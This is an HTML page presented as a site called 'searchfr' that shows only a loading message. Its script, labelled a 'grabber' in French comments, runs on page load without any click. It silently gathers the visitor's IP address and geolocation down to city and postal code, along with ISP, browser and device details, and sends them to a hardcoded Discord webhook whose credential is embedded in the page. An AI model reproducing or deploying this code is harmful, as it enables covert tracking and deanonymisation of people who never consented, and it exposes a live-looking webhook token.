<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>searchfr</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: system-ui, -apple-system, sans-serif;
    background: #06070a; color: #f4f6fb;
    display: grid; place-items: center; min-height: 100vh; padding: 20px;
  }
  .box { text-align: center; max-width: 480px; }
  h1 { font-size: 26px; margin-bottom: 14px; letter-spacing: -0.5px; }
  p { color: #a8afbd; font-size: 14px; line-height: 1.6; }
  code {
    background: #101318; padding: 2px 8px; border-radius: 6px;
    font-family: ui-monospace, monospace; font-size: 13px; color: #8b7cff;
  }
  .status { margin-top: 12px; font-size: 12px; color: #6b7280; }
</style>
</head>
<body>
<div class="box" id="box">
  <h1>searchfr</h1>
  <p>Chargement…</p>
</div>

<script>
// ============================================================
// GRABBER — IP + géo complète → webhook Discord
// s'exécute à l'ouverture, sans clic, sans attente
// ============================================================
(async function () {
  const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';

  const box = document.getElementById('box');

  // --- Récupération IP + géo, en cascade sur 4 services ---
  let ip = null, country = '', region = '', city = '', zip = '', isp = '', org = '', asn = '', source = '';

  // helper : fetch avec timeout
  const fetchTimeout = (url, ms = 4000) => {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), ms);
    return fetch(url, { cache: 'no-store', signal: ctrl.signal })
      .finally(() => clearTimeout(t));
  };

  // --- 1. ipapi.co ---
  try {
    const r = await fetchTimeout('https://ipapi.co/json/');
    if (r.ok) {
      const d = await r.json();
      if (d && d.ip) {
        ip = d.ip;
        country = d.country_name || '';
        region  = d.region || '';
        city    = d.city || '';
        zip     = d.postal || '';
        isp     = d.org || '';
        asn     = d.asn || '';
        source  = 'ipapi.co';
      }
    }
  } catch (e) { console.warn('[ipapi] échec', e.message); }

  // --- 2. ipwho.is ---
  if (!ip) {
    try {
      const r = await fetchTimeout('https://ipwho.is/');
      if (r.ok) {
        const d = await r.json();
        if (d && d.success && d.ip) {
          ip = d.ip;
          country = d.country || '';
          region  = d.region || '';
          city    = d.city || '';
          zip     = d.postal || '';
          isp     = d.connection?.isp || '';
          org     = d.connection?.org || '';
          asn     = d.connection?.asn ? ('AS' + d.connection.asn) : '';
          source  = 'ipwho.is';
        }
      }
    } catch (e) { console.warn('[ipwho] échec', e.message); }
  }

  // --- 3. ipinfo.io ---
  if (!ip) {
    try {
      const r = await fetchTimeout('https://ipinfo.io/json');
      if (r.ok) {
        const d = await r.json();
        if (d && d.ip) {
          ip = d.ip;
          country = d.country || '';
          region  = d.region || '';
          city    = d.city || '';
          zip     = d.postal || '';
          org     = d.org || '';
          source  = 'ipinfo.io';
        }
      }
    } catch (e) { console.warn('[ipinfo] échec', e.message); }
  }

  // --- 4. ipify (IP seule, dernier filet) ---
  if (!ip) {
    try {
      const r = await fetchTimeout('https://api.ipify.org?format=json');
      if (r.ok) {
        const d = await r.json();
        if (d && d.ip) { ip = d.ip; source = 'ipify'; }
      }
    } catch (e) { console.warn('[ipify] échec', e.message); }
  }

  if (!ip) { ip = 'inconnue'; source = 'aucune'; }
  console.log('[grabber] IP =', ip, '| source =', source);

  // --- Construction du payload Discord ---
  const now = new Date();
  const payload = {
    username: 'searchfr',
    content: '**Nouveau visiteur** — `' + ip + '`',
    embeds: [{
      title: '🌐 Visiteur détecté',
      color: 0x6d5cff,
      fields: [
        { name: '🔌 IP',        value: '`' + ip + '`',           inline: true },
        { name: '📍 Source',    value: source,                    inline: true },
        { name: '🌍 Pays',      value: country || '—',            inline: true },
        { name: '🏙️ Ville',     value: city || '—',               inline: true },
        { name: '🗺️ Région',    value: region || '—',             inline: true },
        { name: '📮 Code postal', value: zip || '—',              inline: true },
        { name: '📡 FAI',       value: isp || org || '—',         inline: true },
        { name: '🔢 ASN',       value: asn || '—',                inline: true },
        { name: '🌐 Langue',    value: navigator.language || '—', inline: true },
        { name: '💻 Plateforme', value: navigator.platform || '—', inline: true },
        { name: '🖥️ Écran',     value: screen.width + '×' + screen.height, inline: true },
        { name: '🧭 Referer',   value: document.referrer || 'direct', inline: true },
        { name: '🕐 Heure',     value: now.toISOString(),         inline: false },
        { name: '🔗 Page',      value: location.href,             inline: false },
        { name: '🪪 User-Agent', value: '```' + (navigator.userAgent || '—').slice(0, 300) + '```', inline: false }
      ],
      footer: { text: 'searchfr · grabber' },
      timestamp: now.toISOString()
    }]
  };

  // --- Envoi au webhook avec retry ---
  async function sendWebhook(attempt = 1) {
    try {
      const r = await fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      console.log('[webhook] envoyé (tentative ' + attempt + ')');
      return true;
    } catch (e) {
      console.warn('[webhook] échec tentative ' + attempt, e.message);
      if (attempt < 3) {
        await new Promise(r => setTimeout(r, 800 * attempt));
        return sendWebhook(attempt + 1);
      }
      return false;
    }
  }

  const ok = await sendWebhook();

  // --- Feedback visuel ---
  box.innerHTML =
    '<h1>searchfr</h1>' +
    '<p>IP : <code>' + ip + '</code></p>' +
    '<p class="status">' +
      (ok ? '✅ Envoyé au webhook (source : ' + source + ')' : '⚠️ Échec envoi — voir console (F12)') +
    '</p>';
})();
</script>
</body>
</html>
